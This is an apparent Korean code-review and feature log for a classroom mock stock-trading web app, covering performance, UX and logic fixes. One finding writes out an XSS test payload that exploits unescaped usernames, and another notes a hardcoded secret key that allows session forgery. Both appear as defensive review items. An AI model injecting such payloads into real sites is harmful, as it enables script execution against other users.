- **`_auto_start_lottery_if_due()` 가 모든 `/api/rooms/<rid>` 폴링에서 실행** (`app.py:470`): `get_room()` 라우트 (`app.py:432-473`) 의 정상 반환 직전에 `_auto_start_lottery_if_due(room)` 를 항상 호출. 참가자·진행자 합산 30여명이 10초마다 폴링하면 분당 180회 이 함수가 실행되며, 매 실행마다 `_lot_round_due()` 가 `_lots.setdefault(room.id, ...)` 를 포함한 계산을 수행. 복권 트리거 기준은 `remaining` 과 `total_s` 의 비율로 결정되므로, 이미 복권이 진행 중이거나(`lot.get('current')...state in ('picking', 'drawing')`) 방이 `active` 가 아닐 때는 `_lot_round_due()` 가 `None` 을 반환(`app.py:180-181`)해 조기 탈출. 그러나 Lock 진입 없이 dict 접근을 반복하는 비용은 여전히 발생. `room.status == 'active'` 조건 체크를 `_auto_start_lottery_if_due()` 진입부로 올려(`app.py:409`에 이미 있음) 리팩터링 불필요하지만, 인라인 조건으로 `if room.status == 'active': _auto_start_lottery_if_due(room)` 로 단락 평가를 명확히 하면 가독성 향상.

- **주식 차트 기간 파라미터가 실질적으로 의미 없음** (`stock_service.py:281-309`, `app.py:715-719`): 클라이언트는 `1d/1w/1mo/3mo/1y` 중 하나를 전달하고, 서버는 이를 yfinance 스타일 기간으로 매핑(`app.py:715`)하지만 실제로는 `get_history()` 에서 `n_bars = {'1d': 30, '5d': 5, '1mo': 30, '3mo': 90}.get(period, 30)` 로 bar 수만 바뀌고, 모두 `datetime.utcnow()` 기준 과거 N일을 랜덤 생성(`stock_service.py:296`). "1일" 탭이 실제로는 30개 랜덤 일별 캔들을 표시하는 등 기간 의미가 왜곡됨. 간단한 해결: 기간 탭 UI를 제거하고 게임 시작 이후 실제 가격 변동 이력(tick log)을 서버에 누적해 표시하거나, 현재처럼 랜덤 생성이라면 UI에서 기간 탭을 없애고 단일 차트로 단순화.

- **`doAuth()` 성공 후 `api.post('/api/rooms', ...)` 실패 시 사용자만 생성된 고아 상태** (`app.js:133-138`, `app.py:329-390`): `doCreateRoom()` 에서 `await doAuth(sid, hostName)` 이 성공하면 DB 에 `User` 가 생성/조회됨. 이후 `api.post('/api/rooms', ...)` 가 실패(네트워크 오류, 방 이름 중복 등)하면 사용자는 존재하지만 `S.room` 이 없는 상태로 `screen-host-create` 화면에 남음. 재시도 시 동일 학번으로 재인증 → 이미 존재하는 User 조회 → 정상 작동하므로 심각하지 않지만, 에러 상태에서 입력란을 비우지 않아 혼란 여지. `err.textContent = data.error; return;` 전에 입력 상태를 유지하는 것은 UX 상 올바르나, 실패 메시지 후 방 이름 입력란에 포커스를 이동(`document.getElementById('room-name').focus()`)하면 재시도 경험 개선.

- **`_quiz_settings` 와 `_roulette_config` 가 서버 재시작 시 초기화** (`app.py:1246-1247`, `app.py:250`): 게임 중 서버가 재시작(Render 무료 플랜 자동 재배포 등)되면 진행자가 설정한 퀴즈 보상 비율과 룰렛 배율·확률이 기본값으로 리셋됨. 반면 복권 진행 라운드는 `room.lottery_rounds_done` DB 컬럼으로 복구(`app.py:174-179`). 동일 패턴으로 `Room` 에 `quiz_settings_json` (VARCHAR), `roulette_config_json` (VARCHAR) 컬럼을 추가해 진행자 설정 저장 시 DB 에도 반영하면 재시작 내성 확보 가능. Render 무료 플랜 특성상 수업 중 재시작이 발생할 수 있어 우선순위 높음.


---

## 2026-07-09 (2차)

### 추가하면 좋을 기능

- **포트폴리오 탭 종목별 매수/매도 버튼 클릭 시 실시간 가격으로 모달 열기** (`app.js:1557-1561`, `app.js:1327-1357`): `holdings-list`의 매수/매도 버튼이 `openStockModal(symbol, {price: h.current_price, ...})` 형태로 `h.current_price`를 fallback으로 전달. `openStockModal()`은 `S.stocks.find(s => s.symbol === symbol)` 우선 조회하지만, 사용자가 포트폴리오 탭을 오래 유지하는 동안 `S.stocks`가 마지막 `loadMarket()` 당시 캐시라면 이미 만료된 가격으로 수량 계산이 진행됨. `openStockModal()` 내 `const port = await api.get(...)` 호출 전에 `const freshPrice = await api.get(\`/api/rooms/${S.room.id}/stocks\`)` 를 추가해 최신 가격으로 `S.tradePrice` 를 갱신하거나, 단순히 포트폴리오 → 매수/매도 버튼 클릭 시 `loadMarket()` 를 먼저 await 한 뒤 `openStockModal(symbol)` 을 호출하면 서버 1회 추가 요청으로 해결.

- **진행자 대시보드에 종목별 전체 학생 보유 현황 요약 뷰** (`app.py:542-562`, 신규 엔드포인트, `app.js:303-312`): 교사가 "지금 학생들이 어떤 종목에 집중 투자하는지" 실시간으로 파악하면 수업 토론 주제로 활용 가능. 현재 진행자 화면의 "시장" 탭에는 시세만 표시. `GET /api/rooms/<rid>/host/holdings-summary` 엔드포인트를 추가해 `RoomHolding.query.filter_by(room_id=rid)` 결과를 `symbol`로 집계(보유 학생 수, 총 보유 주, 총 평가금액)해 반환. 서버 10줄, 진행자 시장 탭 하단에 표 형태로 추가하면 수업 맥락 실시간 제공.

- **스와이프 제스처로 탭 전환 지원** (`app.js:1209-1226`, `app.js:600-610`): `PAGE_ORDER = ['market','portfolio','deposit','rankings','education']` 순서가 이미 정의되어 있지만 모바일에서 터치 스와이프로 탭 전환이 안 됨. 교실 환경 특성상 학생 대부분이 스마트폰 사용. `document.getElementById('screen-p-game')` 에 `touchstart`/`touchend` 리스너를 추가해 dx > 50px이면 `PAGE_ORDER[PAGE_ORDER.indexOf(S.currentPage) ± 1]` 로 `showPage()` 호출하는 15줄 코드로 구현. 서버 변경 불필요, 네이티브 앱 수준의 UX 개선.

- **결과 화면에서 내 거래 통계 요약 표시** (`app.js:1760-1777`, `app.py:829-847`): `loadResults()` 내 `results-my-stats` 카드(`app.js:1761`)는 최종 순위·자산·수익률 3가지만 표시. 이미 구현된 `GET /api/rooms/<rid>/transactions` 엔드포인트를 결과 화면에서 추가 호출해 `action='BUY'` / `action='SELL'` 건수를 집계하고 가장 많이 거래한 종목(`most_traded`)을 찾아 "총 XX번 거래 (매수 N · 매도 M)" + "최애 종목: 삼성전자" 를 표시하면 학생이 자신의 투자 패턴을 돌아볼 수 있는 교육적 피드백 제공. 프론트 20줄 추가, 서버 변경 없음.

- **게임 종료 후 동점자 2차 정렬 기준 부재** (`app.py:821-823`, `app.js:1841-1885`): `get_rankings()` 에서 `board.sort(key=lambda x: x['total_value'], reverse=True)` 단일 키 정렬 사용. 동점자가 발생하면 `RoomMember.query.filter_by()` 반환 순서(SQLite rowid 순)에 의존해 결과가 비결정적임. 결과 화면과 엑셀 내보내기에서 동점자 순위가 다르게 표시될 수 있음(`export_rankings()` `app.py:1440`도 동일 문제). `board.sort(key=lambda x: (-x['total_value'], x['user_id']))` 로 2차 정렬 기준을 `user_id` 오름차순으로 고정하면 동일 자산이라도 먼저 가입한 학생이 상위 순위를 가져가는 일관된 규칙이 생김. 양쪽 엔드포인트에 한 줄씩 교체.

- **실제 게임 내 가격 변동 이력을 차트에 표시** (`stock_service.py:105-119`, `stock_service.py:174-190`): 현재 차트는 `get_history()`에서 현재가 기준으로 역방향 랜덤 워크를 생성해 허구의 과거 데이터를 보여줌. `StockService.__init__`에 `self._price_log: dict = {sym: [] for sym in STOCKS}` (각 심볼당 `(timestamp, price)` 튜플 리스트)를 추가하고, `get_price()`에서 가격 갱신 시 `self._price_log[sym].append((now, new_price))`를 기록하면 실제 시계열 차트 제공 가능. `get_history()` 에서 `_price_log` 데이터를 우선 사용하고, 초기 데이터가 부족하면 현재 코드의 랜덤 생성으로 fallback. 메모리 상한은 `collections.deque(maxlen=200)` 으로 관리.

### 제거/단순화할 것들

- **`minigame_close()` 내 `Room.query.get(rid)` — deprecated SQLAlchemy API 혼재** (`app.py:977`): 동일 파일의 모든 다른 위치는 `db.session.get(Room, rid)` 또는 Flask-SQLAlchemy의 `Room.query.get_or_404(rid)` 를 사용하는데, `minigame_close()` 안의 `room = Room.query.get(rid)` 만 SQLAlchemy 2.0에서 제거된 `Query.get()` 스타일. `room = db.session.get(Room, rid)` 1줄 교체로 해결. 에러가 발생하지 않는 이유는 현재 Flask-SQLAlchemy 버전이 아직 지원하기 때문이지만, 의존성 업그레이드 시 무음 실패 위험.

- **`create_room()` 에서 `float()` / `int()` 변환에 `try/except` 없음** (`app.py:384-386`): `starting_cash=max(100000, float(d.get('starting_cash', 10_000_000)))`, `deposit_rate=max(0, min(50, float(d.get('deposit_rate', 3.0))))` — 악의적 또는 잘못된 요청에서 문자열 값이 오면 `ValueError`가 전파되어 Flask가 500 응답을 반환. 동일 파일의 `trade()` (`app.py:738`), `host_market_event()` (`app.py:1353`) 등은 `try: ... except: return jsonify({'error': ...}), 400` 패턴으로 방어. `create_room()` 상단에 `try: dur=max(1, min(360, int(d.get('duration_minutes', 30)))); cash=max(100000, float(d.get('starting_cash', 10_000_000))); rate=max(0, min(50, float(d.get('deposit_rate', 3.0)))) \nexcept (TypeError, ValueError): return jsonify({'error': '입력 형식 오류'}), 400` 블록 추가.

- **`get_rankings()` 와 `host_members()` 의 N+1 쿼리 문제** (`app.py:807-823`, `app.py:542-562`): 두 엔드포인트 모두 `for m in RoomMember.query.filter_by(room_id=rid).all()` 루프 내에서 `member_total_value(rid, m.user_id)` 를 호출. `member_total_value()` 는 내부에서 `RoomMember`, `RoomHolding`, `Deposit` 각 1 쿼리 실행 — N=30명 방에서 순위 조회 1회에 91 DB 쿼리. `holdings = RoomHolding.query.filter_by(room_id=rid).all()` + `deposits = Deposit.query.filter_by(room_id=rid, status='active').all()` 2개 일괄 쿼리 후 Python dict로 집계하면 쿼리 수를 O(1)로 줄일 수 있음. 10초 폴링 × 30명 = 분당 180회 순위 요청에서 DB 부하 91배 감소.

- **`app.py:13` 하드코딩 fallback secret key에 경고 없음** (`app.py:13`): `app.secret_key = os.environ.get('SECRET_KEY', 'mock-stock-game-secret-2024')` — 환경변수 미설정 시 알려진 고정 키로 세션이 서명되어 공개 배포 환경에서 세션 위조 가능. Render 등 공개 호스팅 사용 시 실제 보안 위험. `if not os.environ.get('SECRET_KEY'): import warnings; warnings.warn('SECRET_KEY 환경변수가 설정되지 않았습니다. 프로덕션에서 반드시 설정하세요.', stacklevel=2)` 경고를 앱 시작 시 출력하도록 추가. 또는 `os.environ.get('SECRET_KEY') or os.urandom(32)` 로 랜덤 바이트 사용(재시작 시 세션 무효화됨을 인지 필요).

- **`_quiz_state` 딕셔너리 정리에 O(N) 전체 순회** (`app.py:159-160`): `_end_room()` 내 `for k in [k for k in _quiz_state if k[0] == room.id]: del _quiz_state[k]` — 퀴즈 상태 딕셔너리 전체를 순회하며 해당 방의 엔트리를 삭제. 방이 수백 개 동시 활성 상태라면 각 방 종료 시 O(전체 활성 사용자 수) 순회 발생. `_quiz_state_by_room: dict = {}` (room_id → set of user_id) 보조 인덱스를 `_quiz_state` 삽입 시 함께 관리하면 종료 시 `for uid in _quiz_state_by_room.pop(rid, set()): _quiz_state.pop((rid, uid), None)` 로 O(해당방 인원) 처리 가능. 현실적 규모(50개 교실, 각 30명 = 1500 항목)에서는 큰 문제 아니지만, 코드 명확성 개선 차원.

- **`lobby_members()` 엔드포인트가 `/host/` URL에 있으나 진행자 권한 체크 없음** (`app.py:577-585`): `GET /api/rooms/<rid>/host/lobby-members` 는 `@login_required` 데코레이터만 있고 `room.host_id != user.id` 체크가 없어 방의 참가자(학생)도 자유롭게 호출 가능. 실제로 `loadPLobbyMembers()`(`app.js:578`)에서 참가자 로비에서도 이 엔드포인트를 호출하도록 의도적 설계이나, URL 네임스페이스(`/host/`)와 실제 접근 권한이 불일치해 코드 리딩 시 혼란을 유발. `/api/rooms/<rid>/host/lobby-members` → `/api/rooms/<rid>/lobby-members` 로 URL 이동하거나, 현재 URL 유지 시 함수 상단에 `# NOTE: /host/ prefix지만 참가자도 접근 허용 — 로비 공개 정보` 주석 추가로 의도를 명확히.

---

## 2026-07-10

### 추가하면 좋을 기능

- **진행자 전용 프로젝터 뷰 / 대형 화면 모드** (`index.html:114-308`, `app.js:258-278`): 교실에서 교사가 화면을 빔프로젝터로 띄울 때 모바일 최적화 레이아웃은 가독성이 떨어짐. `screen-host-game` 내 순위 탭(`htab-rank-content`)에 `?projector=1` 쿼리파라미터를 감지해 폰트 크기 140%, 차트 최대 높이 500px, QR 코드 240px를 자동 적용하는 CSS 클래스 토글(`document.body.classList.toggle('projector', ...)`)이면 서버 변경 없이 구현 가능. 교실 실용성 최상위 개선.

- **진행자가 퀴즈를 전체 학생에게 푸시하는 기능** (`app.py:1248-1342`, `app.js:832-895`): 현재 학생이 자발적으로 🧠 버튼을 눌러야만 퀴즈에 참여 가능. 교사가 수업 흐름에 맞춰 특정 순간에 퀴즈를 강제로 띄우는 것이 불가. `GET /api/rooms/<rid>` 응답(`room_dict()`, `app.py:278-305`)에 `quiz_push_ts` 필드를 추가하고, 진행자가 퀴즈를 푸시하면 이 타임스탬프를 갱신. 참가자 폴링 루프(`app.js:613-651`)에서 이전 타임스탬프와 비교해 새로운 값이면 `openQuiz()` 자동 실행. 서버 측 진행자 엔드포인트 1개 추가, DB 컬럼 추가 없이 `_quiz_push: dict = {}` (room_id → timestamp) 인메모리 딕셔너리로 관리 가능.

- **게임 종료 후 참가자의 거래 내역 조회 기능** (`app.py:829-847`, `screen-results`, `app.js:1702-1795`): `GET /api/rooms/<rid>/transactions` 는 `@login_required` 로 보호되어 있지만 게임 종료 후(`room.status == 'ended'`)에도 접근 가능. 그러나 결과 화면(`screen-results`)에는 최종 순위만 표시되고 개인 거래 내역을 볼 수 없음. `loadResults()` 내 `results-my-stats` 카드에 "📋 거래 내역 보기" 토글 버튼을 추가해, 클릭 시 `GET /api/rooms/<rid>/transactions` 의 첫 페이지를 인라인 표시하면 학생이 자신의 투자 패턴을 돌아볼 수 있는 교육적 피드백 제공. 추가 엔드포인트 불필요.

- **예금 만기/해지 이력을 게임 중 확인 가능하게** (`app.js:1629`, `app.py:852-876`): `loadDepositsPage()` (`app.js:1621`)에서 `active` 상태만 필터링해 활성 예금 외에 해지/만기된 예금은 화면에 표시하지 않음. `deposits.filter(d => d.status !== 'active')` 결과를 "이전 예금" 섹션으로 접을 수 있게(`<details>` 태그) 하단에 추가하면 학생이 "예금하면 어떻게 이자가 쌓이는지" 기록으로 확인 가능. 서버 변경 없음, 프론트 10줄 추가.

- **`_rlt_active` count 누수 방지를 위한 서버사이드 타임아웃** (`app.py:252`, `app.py:938-963`, `app.py:965-994`): 학생이 룰렛 모달을 열고(`minigame/open`) 브라우저를 강제 종료하면 `minigame/close` 가 호출되지 않아 `_rlt_active[rid]['count']` 가 감소하지 않음. 마지막 학생이 이 상황이라면 게임이 영구 일시정지 상태에 갇힘. `/api/rooms/<rid>` 폴링 핸들러(`app.py:432`)에서 `rlt_triggered == True && status == 'paused'` 인데 `_rlt_active[rid]['count'] > 0` 이고 마지막 `paused_at` 에서 5분 이상 경과한 경우 자동으로 `_end_room(room)` 을 호출하는 안전 장치 추가. 수업 중 네트워크 불안정 환경에서 교사가 개입 없이 게임이 멈추는 상황 방지.

### 제거/단순화할 것들

- **`force_price()`와 `_next_price()`의 가격 하한 불일치** (`stock_service.py:139`, `stock_service.py:225`): `force_price()` 에서 강제로 주가를 낮출 때 최솟값을 `base * 0.3`(30%)까지 허용하지만, 이후 자동 tick에서 `_next_price()` 의 최솟값 클램핑은 `base * 0.6`(60%) 임. 진행자가 주가를 35%로 강제 인하한 직후 첫 tick에서 60% 선으로 즉시 튀어오르는 현상 발생 — 교사가 "주가 급락" 이벤트를 연출했는데 다음 순간 +70% 급등이 발생해 학생이 혼란. `_next_price()` 의 클램핑을 `max(base * 0.3, min(base * 3.0, new_price))` 로 통일하면 됨. 한 줄 수정.

- **`get_history()`에서 '1y' 기간이 '1mo'와 동일한 30개 막대를 반환** (`stock_service.py:292`): `n_bars = {'1d': 30, '5d': 5, '1mo': 30, '3mo': 90}.get(period, 30)` — `'1y'` 키가 딕셔너리에 없어 기본값 30이 적용. 결과적으로 "1년" 탭과 "1달" 탭이 동일한 30개 랜덤 일별 캔들을 표시. `app.py:715`에서 `'1y'` → `('1y','1wk')` 로 매핑하나 실제로 `get_history()` 에서 무시됨. 딕셔너리에 `'1y': 365` 추가하거나, 클라이언트 UI에서 "1년" 기간 탭 자체를 제거해 혼란 방지. 전자가 더 나음: `stock_service.py:292` 한 줄 수정.

- **로비 대기 중 30명 학생이 5초마다 `lobby-members` 폴링 — 캐시 없음** (`app.py:577-585`, `app.js:562`): `enterParticipantLobby()` 에서 `setInterval(..., 5000)` 으로 학생마다 5초 폴링. 30명 × 1/5s = 6 req/s 로 `lobby_members()` 를 반복 호출하지만 이 엔드포인트에는 캐시가 없음(대조적으로 `get_room_cached()` 는 1.5s TTL 캐시 존재). 동일 패턴의 `_room_cache` 방식으로 `_lobby_cache: dict = {}` (room_id → {ts, data}) 를 추가하고 TTL 2s를 적용하면 DB 쿼리가 초당 최대 0.5회로 제한됨. 앱 서버가 `active` 상태(학생 입장 후)와 달리 `waiting` 상태(로비)에서도 높은 부하 발생을 방지.

- **`S.depCash`와 `S.tradeCash` 두 개의 현금 상태 변수** (`app.js:14`, `app.js:452`, `app.js:1349`, `app.js:1656`): 현금 잔액이 `S.tradeCash`(매매 모달용)와 `S.depCash`(예금 탭용) 두 곳에 나뉘어 관리됨. 거래 체결 후 `S.tradeCash = data.cash`(`app.js:1443`)가 갱신되지만 `S.depCash`는 `loadDepositsPage()` 호출 시에만 갱신. 학생이 매수 후 예금 탭을 이동하지 않은 채 예금을 시도하면 직전 캐시된 `S.depCash` 기준으로 퍼센트 버튼이 동작해 실제 잔액보다 많은 금액이 입력됨(서버에서 400 반환되므로 데이터 손상은 없지만 UX 혼란). `S.cash` 단일 변수로 통합하거나 `S.tradeCash` 갱신 시 `S.depCash`도 동기화하는 헬퍼 함수(`setCash(v) { S.tradeCash = S.depCash = v; }`)로 일원화.

- **`refreshMyRank()` 가 참가자 폴링 루프 내에서 매번 독립적으로 `rankings` API 호출** (`app.js:613-651`, `app.js:735-753`): `enterParticipantGame()` 의 `setInterval` 콜백(`app.js:613`)에서 `refreshMyRank()`와 `loadParticipantRankings()` 모두 각각 `/rankings` 엔드포인트를 호출. 참가자가 "순위" 탭에 있으면 10초마다 `/rankings` 를 2번 호출. `refreshMyRank()` 내부에서 이미 전체 순위 데이터를 받으므로 결과를 `S._lastRankings` 에 저장하고 `loadParticipantRankings()` 에서 캐시를 우선 사용하도록 분리하면 폴링 당 API 호출 1회 절감.


## 2026-07-10 (2차)

### 추가하면 좋을 기능

- **브라우저 뒤로 가기로 게임 화면 이탈 방지** (`app.js:589-651`, `app.js:61-68`): SPA 특성상 학생이 게임 중 스마트폰의 뒤로 가기를 누르면 `history.back()`이 실행되어 landing 화면으로 이동, 게임은 서버에서 계속 진행되지만 학생은 재접속해야 함. 교실 환경에서 빈번한 실수. `enterParticipantGame()` 시작부에 `history.pushState(null, '', location.href)` 로 히스토리 엔트리를 추가하고, `window.addEventListener('popstate', () => { if (S.room?.status === 'active') { history.pushState(null, '', location.href); toast('게임 중에는 뒤로 가기를 사용할 수 없습니다.', 'error'); } })` 를 앱 초기화 시점에 등록하면 의도치 않은 이탈을 방지. 서버 변경 불필요, 프론트 5줄.

- **포트폴리오 도넛 차트 "섹터별 보기" 토글** (`app.js:1480-1502`, `app.js:1456-1564`): 현재 포트폴리오 도넛 차트는 종목명별로 파이를 나눠 분산 투자 여부를 한눈에 파악하기 어려움. 차트 상단에 "종목별 | 섹터별" 토글 버튼을 추가해, 섹터별 보기 선택 시 `data.holdings.reduce((acc, h) => { acc[h.sector] = (acc[h.sector]||0) + h.current_value; return acc; }, {})` 로 집계한 데이터를 동일 도넛 차트에 업데이트. 학생이 자신의 투자가 얼마나 분산되어 있는지 시각적으로 확인하는 교육 활동과 직결. 서버 변경 불필요, `loadPortfolio()` 내 10줄 추가.

- **파산 학생 진행자 실시간 강조 및 알림** (`app.py:542-562`, `app.js:408-431`): 퀴즈 오답 연쇄 청산, 룰렛 고배팅 실패 등으로 총 자산이 0원 이하가 된 학생이 있어도 진행자 순위 목록에서 시각적 구분이 없어 교사가 인지하지 못함. `host_members()` 응답 각 항목에 `'is_bankrupt': total <= 0` 필드를 추가하고(`app.py:557` 근처), `loadHostMembers()` 에서 해당 행에 `style="background:rgba(248,81,73,.15);border-left:3px solid var(--down)"` 를 적용하면 교사가 즉시 `host_adjust()` 로 소액을 지급하는 교육적 개입 가능. 서버 1필드, 프론트 CSS 3줄.

- **진행자 시장 시나리오 프리셋 버튼** (`app.py:1345-1360`, `app.js:373-383`): 진행자 "시장 이벤트" 패널에서 섹터와 퍼센트를 매번 수동 입력해야 해 수업 흐름이 끊김. `SCENARIO_PRESETS = [{ name:'경기침체', events:[{sector:'금융',pct:-8},{sector:'자동차',pct:-10},{sector:'통신',pct:3}] }, ...]` 상수를 정의하고 `applyScenario(i)` 함수가 순차적으로 `doMarketEvent()`를 호출하면 수업 주제에 맞는 시나리오를 1클릭으로 연출 가능. "에너지 위기", "AI 버블", "중앙은행 금리 인상" 등을 미리 준비해 두면 교육 맥락 연계 강화. 서버 변경 없이 `app.js` 약 30줄 + `index.html` 버튼 추가.

- **종목별 목표가 알림 기능** (`app.js:1287-1323`, `filterStocks(prevPrices)`): 학생이 보고 있는 종목에 목표 매도가/매수 진입가를 설정하면, `filterStocks()` 내 가격 비교 루프(`app.js:1313-1323`)에서 임계값 돌파 시 `toast('삼성전자 목표가 도달: 75,000원', 'success')` 토스트 표시. `S.priceAlerts = JSON.parse(localStorage.getItem('priceAlerts') || '{}')` (symbol → {above?: price, below?: price})로 localStorage에 저장해 서버 변경 없이 구현 가능. 주식 모달 하단에 "목표가 설정" 입력 필드 1개 추가. 투자 계획 수립 개념 교육과 직결.

- **거래 내역 탭에 룰렛·복권 이벤트 필터 카테고리 추가** (`app.js:1569-1591`, `app.py:829-847`): `RoomTransaction.action` 에 이미 `'RLT'`(룰렛), `'ADJ'(note 포함)`(복권 당첨) 이 기록되어 있으나, 거래 내역 탭에는 필터 없이 전체 목록만 표시. 탭 상단에 "전체 | 매수 | 매도 | 룰렛/복권 | 조정" 필터 버튼을 추가하고, 선택한 필터를 `loadTxn()` 의 URL 파라미터로 전달(`?action=RLT`)하면 학생이 자신의 이벤트 참여 결과를 따로 조회 가능. 서버에 `request.args.get('action', '')` 필터 1줄 추가로 구현.

---

### 제거/단순화할 것들

- **`withdraw_deposit()` 이 `RoomTransaction` 레코드를 생성하지 않음** (`app.py:904-916`): 예금 해지 시 `dep.status = 'withdrawn'`, `m.cash += dep.amount`만 실행되고 `RoomTransaction` 기록이 없음. 동일 파일에서 룰렛(`app.py:1065`), 퀴즈 패널티(`app.py:1315-1325`), 복권 당첨(`app.py:218-220`) 모두 `RoomTransaction`을 생성하는 것과 불일치. 학생의 거래 내역 탭에 "갑자기 현금이 늘어났지만 이유 없음" 현상 발생. `db.session.add(RoomTransaction(room_id=rid, user_id=user.id, symbol='DEPOSIT', action='ADJ', shares=0, price=0, amount=dep.amount, note='예금 해지'))` 를 `dep.status='withdrawn'` 직후에 추가하는 1줄로 해결. 예금 생성(`create_deposit()`, `app.py:878`)도 동일하게 트랜잭션 기록 추가 고려.

- **`ROULETTE_OUTCOMES` 상수의 `seg_start`/`seg_end` 값이 완전한 dead data** (`app.py:242-248`): `_rlt_outcomes()` (`app.py:261-276`)가 `cumulative` 누적으로 `seg_start/seg_end`를 동적 계산해 새 dict를 반환하므로, `ROULETTE_OUTCOMES[i]['seg_start']`/`['seg_end']` 는 코드 어디서도 읽히지 않음. 5개 항목 × 2개 필드 = 10개 하드코딩 값이 방치되어 이후 개발자가 `ROULETTE_OUTCOMES`를 직접 수정하면 `_rlt_outcomes()` 출력에 반영되지 않아 혼란 유발. 두 필드를 삭제하거나 `# 참고용 — _rlt_outcomes()에서 동적 재계산됨` 주석으로만 남길 것.

- **XSS 취약점: `m.username`/`e.username` 을 HTML 이스케이프 없이 `innerHTML` 삽입** (`app.js:421`, `app.js:583`): `loadHostMembers()` 의 `${m.username}`, `loadPLobbyMembers()` 의 `${m.username}` 등 여러 곳에서 사용자명을 템플릿 리터럴로 `innerHTML`에 직접 삽입. 사용자명에 `<img src=x onerror=alert(1)>` (24자, 서버 상한 30자 이내)를 포함하면 다른 학생/진행자 화면에서 JS가 실행됨. `app.js:897-898`에 `escHtml()` 함수가 이미 정의되어 있으나 사용자명 렌더링에 적용되지 않음. 사용자명이 등장하는 모든 `innerHTML` 템플릿 리터럴에서 `${m.username}` → `${escHtml(m.username)}` 으로 일괄 교체(약 5-7곳). 교실 환경에서 장난기 있는 학생이 악용 가능한 실질 보안 취약점.

- **`loadChart()` 가 기간 탭 전환마다 Chart.js 인스턴스 destroy+recreate로 깜빡임 발생** (`app.js:1375-1397`): `if (S.stockChart) S.stockChart.destroy()` 후 `new Chart(ctx, {...})` 를 매번 생성해 탭 전환 시 흰 깜빡임. `renderHostBarChart()` 가 이미 `app.js:440-447`에서 `.data.labels = ...` + `.update()` 패턴으로 인스턴스를 재사용하도록 개선된 것과 대조적. `loadChart()` 도 `if (S.stockChart && S.stockChart.canvas) { S.stockChart.data.labels = labels; S.stockChart.data.datasets[0].data = closes; S.stockChart.data.datasets[0].borderColor = color; S.stockChart.data.datasets[0].backgroundColor = color+'22'; S.stockChart.update(); return; }` 분기를 `new Chart()` 호출 전에 추가하면 깜빡임 없이 부드러운 기간 전환 구현. 학생이 1일/1달 탭을 빠르게 전환하는 상황에서 UX 개선.

- **`enterHostLobby()` 와 `enterParticipantLobby()` 가 기존 `setInterval` 정리 없이 새 폴링 설정** (`app.js:191`, `app.js:562`): 두 함수 모두 `S.pollInterval = setInterval(...)` 직전에 `clearInterval(S.pollInterval)` 을 호출하지 않아, 네트워크 오류 후 재진입 또는 예외적 흐름에서 두 개의 폴링 인터벌이 동시에 동작할 수 있음. `enterParticipantLobby()` 는 `loadPLobbyMembers()` 와 `api.get('/api/rooms/...')` 가 각각 5초마다 2회씩 호출되는 상황이 발생. 두 함수 첫 줄에 `clearInterval(S.pollInterval); S.pollInterval = null;` 을 추가하는 방어 코드 1줄로 해결. `stopPolling()` 이 정상 흐름에서 선행 호출되므로 성능상 비용 없음.

- **`host_force_price()` 와 `host_market_event()` 가 방 상태(status) 검증 없음** (`app.py:673-687`, `app.py:1345-1360`): 두 엔드포인트 모두 진행자 권한(`room.host_id != user.id`)만 체크하고 `room.status` 를 확인하지 않아 `waiting` 또는 `ended` 상태에서도 호출 가능. `waiting` 상태 호출 시 게임 시작 전 `StockService` 가격을 변경해 학생이 비정상적인 초기 가격을 봄. `ended` 후 호출 시 `cleanup_room_service()` 이후 `get_room_service(rid)` 가 새 `StockService` 를 생성해 불필요한 메모리 점유. 두 함수 유효성 검사 블록에 `if room.status not in ('active', 'paused'): return jsonify({'error': '게임이 진행 중일 때만 사용 가능합니다.'}), 400` 한 줄을 각각 추가.


---

## 2026-07-11

### 추가하면 좋을 기능

- **포트폴리오 탭 보유 종목 행에서 직접 매도 진입 버튼** (`index.html:395-401`, `app.js:holdings 렌더링 부분`): 현재 보유 종목 목록에서 매도하려면 하단 네비게이션 → 시장 탭 → 종목 검색 → 종목 탭 순서로 이동해야 함. 보유 종목 행 오른쪽에 "매도" 버튼을 추가하고 클릭 시 `openStockModal(symbol, price, cash, holding)` 를 직접 호출하면 탭 전환 없이 즉시 매도 가능. 게임 종료 직전 전량 매도 상황에서 학생 불편 해소 효과 크며 서버 변경 불필요.

- **룰렛 트리거 임박(30초 전) 예고 배너** (`app.js:626-630`, `app.py:446-465`): 룰렛은 `remaining_seconds <= 5` 에서 자동 시작되어 예고 없이 게임이 멈추는 경험을 학생들이 혼란스러워함. `enterParticipantGame()` 의 폴링 블록 (`app.js:613-650`) 안에서 `r.remaining_seconds <= 30 && !r.minigame_available && r.status === 'active'` 조건일 때 "⚠️ 30초 후 룰렛이 시작됩니다 — 베팅금 준비!" 배너를 화면 상단에 5초간 표시하면 학생들이 사전 준비(예금 해지, 현금 확보) 가능. `showEndingSoonBanner()` 패턴을 그대로 재사용 가능하며 서버 변경 불필요.

- **게임 종료 후 학생 개인 거래 요약 카드** (`index.html:596-637`, `app.py:829-847`): 결과 화면(`screen-results`)에는 `results-my-stats` div가 있지만 (`index.html:628`) 진입 시 총 자산/수익률 정도만 표시됨. 결과 화면 진입 시 `GET /api/rooms/<rid>/transactions` (기존 API) 를 호출해 매수/매도 횟수, 최다 거래 종목, 룰렛 결과, 복권 당첨 여부를 요약한 카드를 `results-my-stats` 에 추가하면 수업 후 개인 반성문 작성에 활용 가능. 서버 신규 엔드포인트 불필요.

- **진행자 로비 화면에 게임 설정 요약 표시** (`index.html:79-112`, `app.js:186-193`): 호스트 로비 화면에는 방 코드·QR코드·참여자 목록만 있고 "시작 자금", "게임 시간", "예금 금리" 설정값이 노출되지 않음. 학생들이 입장할 때 진행자가 설정을 다시 확인하거나 구두로 안내할 수 없는 상태. `enterHostLobby()` 에서 `S.room.starting_cash`, `S.room.duration_minutes`, `S.room.deposit_rate` 를 QR코드 아래 소형 카드로 렌더링하는 5줄의 HTML 추가로 해결. 설정 수정 기능 없이 표시만으로도 수업 진행에 도움됨.

- **호스트 순위 탭에 참가자 포트폴리오 미리보기(보유 종목 상위 3개) 표시** (`app.py:542-561`, `app.js:408-431`): 진행자는 현재 이름·수익률·총 자산·거래내역만 볼 수 있어 "이 학생은 지금 어느 종목을 들고 있나?" 를 파악하려면 '거래' 버튼을 눌러야 함. `host_members()` 응답에 각 멤버의 상위 3개 보유 종목(symbol + 비중%)을 포함하거나, 별도 `GET /api/rooms/<rid>/host/members/<uid>/holdings` 엔드포인트를 추가해 행 확장(accordion) 시 표시하면 실시간 교육 개입 포인트를 제공. `RoomHolding.query.filter_by(room_id=rid, user_id=uid).all()` 로 간단 구현.

---

